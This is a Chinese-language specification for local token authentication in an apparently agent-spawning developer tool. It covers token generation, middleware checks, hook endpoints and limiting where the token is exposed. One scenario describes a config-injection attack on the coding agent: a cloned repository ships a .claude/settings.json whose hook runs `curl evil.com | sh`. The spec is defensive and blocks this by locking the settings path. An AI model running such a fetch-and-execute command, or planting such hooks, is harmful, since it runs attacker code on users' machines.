# local-auth Specification

## Purpose
TBD - created by archiving change m1-skeleton. Update Purpose after archive.
## Requirements
### Requirement: 启动时生成随机 token

主 server 首次启动时 MUST 生成一个 32 字节的 cryptographically secure 随机 token(如 `crypto.randomBytes(32).toString('hex')`),持久化到项目根目录的 `.env` 文件(`AGENT_TEAM_TOKEN=<hex>`)。后续启动复用该 token,不重新生成。

#### Scenario: 首次启动

- **WHEN** 项目根 `.env` 文件不存在或不含 `AGENT_TEAM_TOKEN`
- **THEN** 生成 64 hex 字符的随机 token,追加写入 `.env`(权限 0600),logger info 一次

#### Scenario: 复启

- **WHEN** `.env` 已含 `AGENT_TEAM_TOKEN`
- **THEN** 直接加载,不重新生成

### Requirement: WS / HTTP middleware token 校验

所有 WS 连接 + 所有非公开 HTTP 端点 MUST 校验 token:
- HTTP: 通过 `Authorization: Bearer <token>` header 或 `?token=<token>` query string
- WS: 在 connection upgrade 阶段通过 `Sec-WebSocket-Protocol` header 或 query string 传入

校验失败返回 401(HTTP)或拒绝 connection(WS)。

#### Scenario: HTTP 缺 token

- **WHEN** 前端调 `POST /tasks` 但未带 Authorization header
- **THEN** middleware 返回 401 `{error: "missing or invalid token"}`

#### Scenario: WS 缺 token

- **WHEN** 前端建立 WS 连接但 query 不含 `?token=`
- **THEN** server 在 connection upgrade 阶段拒绝,close code 4001 reason "missing token"

### Requirement: 前端启动时获取 token

前端启动时 SHALL 通过本地约定方式获取 token(M1 方案:在 `apps/web` 的 dev 启动脚本里把 token 注入 `import.meta.env` 或类似机制,prod 用户运行时通过 CLI 提示或环境变量提供)。token 存在 zustand 的 `auth` slice,所有 fetch / WS 请求自动携带。

#### Scenario: dev 启动

- **WHEN** 用户在终端跑 `pnpm dev`
- **THEN** rsbuild 启动时从 `apps/server/.env` 读 token 写入 `apps/web/.env.local`,前端 build 时注入 `import.meta.env.VITE_AGENT_TEAM_TOKEN`

### Requirement: at-hook 内部 endpoint 用 unguessable path

`at-hook` 二进制 POST 到的 server 内部 endpoint 路径 MUST 包含一个 unguessable 段(基于 token 派生),如 `/internal/at-hook/<sha256(token + 'hook').slice(0,16)>`,而非固定路径,防止本机其他进程嗅探 + 伪造。

#### Scenario: hook 路径正确

- **WHEN** at-hook 二进制 spawn 时,被注入正确路径
- **THEN** POST 成功,server 写入 context_log

#### Scenario: hook 路径伪造

- **WHEN** 其他本机进程尝试 POST 到 `/internal/at-hook/xxxx`(猜不出后缀)
- **THEN** server 404,不接收

### Requirement: 单用户作用域

M1 阶段 SHALL 假设单用户场景:**不实现多用户、不实现 session、不实现 RBAC**。所有 token 验证通过的请求都视为同一个用户。token 是"机器/项目级"的,不是"用户级"。

#### Scenario: 多 tab 都共享一个 token

- **WHEN** 用户在浏览器开 3 个 tab 都连同一个 server
- **THEN** 3 个 WS 连接都用同一个 token 鉴权;所有 tab 都能看到所有 task

### Requirement: worktree 内 .claude/settings.json 不信任

为防止 CVE-2025-59536 类的配置注入攻击(攻击者克隆的代码自带恶意 `.claude/settings.json` 加恶意 hooks),agent spawn 时 MUST 显式锁定 settings 路径为 `<agent-workspace>/.claude/settings.json`,**不允许 worktree 内的 `.claude/` 覆盖**。

#### Scenario: worktree 含可疑 settings

- **WHEN** task worktree 是用户从外部 clone 的代码,内含 `.claude/settings.json` 加了 PreToolUse hook 跑 `curl evil.com | sh`
- **THEN** 由于 spawn 时 `--add-dir <agent-workspace>` 优先 + 显式 settings 路径锁定,Claude Code 不会执行该可疑 hook;agent workspace 的 settings.json 是唯一可信来源

#### Scenario: 实现方式

- **WHEN** 构造 spawn 命令
- **THEN** **agent workspace 在 `--add-dir` 列表的第一位**(Claude Code 默认认第一个),且 `mcp.json` 路径用 `--mcp-config` 显式传 agent workspace 内的文件,不依赖 cwd 默认查找

### Requirement: token 暴露面最小化

token MUST NOT 出现在 chatroom 消息 / artifact / agent workspace 内任何文件 / git log / 前端 localStorage 持久化中。token 只 SHALL 存:`apps/server/.env`(0600 权限) + 前端运行时内存(zustand store,刷新即丢)。

#### Scenario: 前端刷新

- **WHEN** 用户刷新浏览器
- **THEN** zustand auth store 重置,前端无 token,必须重新通过 dev 注入或用户输入

#### Scenario: .env 备份

- **WHEN** 用户 `git add -A`
- **THEN** `.gitignore` 必须含 `.env`,防止 token 被 commit

